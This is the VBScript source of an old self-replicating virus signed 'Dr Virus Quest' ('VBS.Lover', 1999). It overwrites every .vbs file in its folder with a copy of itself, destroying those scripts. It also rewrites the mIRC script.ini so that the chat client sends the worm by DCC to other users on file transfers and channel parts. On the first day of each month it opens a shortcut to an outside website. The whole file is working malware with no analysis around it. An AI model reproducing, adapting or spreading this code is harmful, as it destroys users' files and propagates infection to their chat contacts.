On Error Resume Next
Set WshShell = Wscript.CreateObject("Wscript.Shell")
Set FSO = CreateObject("Scripting.FileSystemObject")
CommandPath = WSHShell.ExpandEnvironmentStrings("%comspec%")
WshShell.Run (CommandPath & " /c for %%a in (*.vbs) do copy /y " & Wscript.ScriptFullName & " %%a >nul")
parent = Wscript.ScriptFullName
vPath = Left(parent, InStrRev(parent, "\"))

For Each target in FSO.GetFolder(vPath).Files
    FSO.CopyFile parent, target.Name, 1
Next

If Day(Now()) = 1 Then
  WScript.Echo "VBS.Trojan by Dr Virus Quest"
  Set oUrlLink = WshShell.CreateShortcut("VQ.URL")
  oUrlLink.TargetPath = "http://virusquest.virtualave.net/"
  oUrlLink.Save
  WshShell.Run ("VQ.URL")
End If

Set Fso = CreateObject("Scripting.FileSystemObject")

If (Fso.FolderExists("c:\mirc")) Then
Set ini = Fso.opentextfile("C:\mirc\script.ini")
Fso.CopyFile wscript.ScriptFullName, "c:\windows\help\lover.vbs"
ini.writeline "[script]"
ini.writeline "ON 1:FILERCVD:*.*:./dcc send $nick c:\windows\help\lover.vbs"
ini.writeline "ON 1:FILESENT:*.*:./dcc send $nick c:\windows\help\lover.vbs"
ini.writeline "ON 1:PART:#:/if ($nick == $me) { halt } | .dcc send $nick c:\windows\help\lover.vbs"
ini.writeline "ctcp 1:ping:?:/notice $nick Are you my lover? But I am your's lover! | /halt"
ini.writeline "ON 1:TEXT:*real*:#:/msg $chan Are you my lover? But I am your's lover!"
ini.writeline "ON 1:join:#:/msg $nick Lover"
ini.writeline "; VBS.Lover by Dr Virus Quest"
ini.writeline "; Origin from Malaysia"
ini.writeline "; Copyright©1999"
ini.Close
End If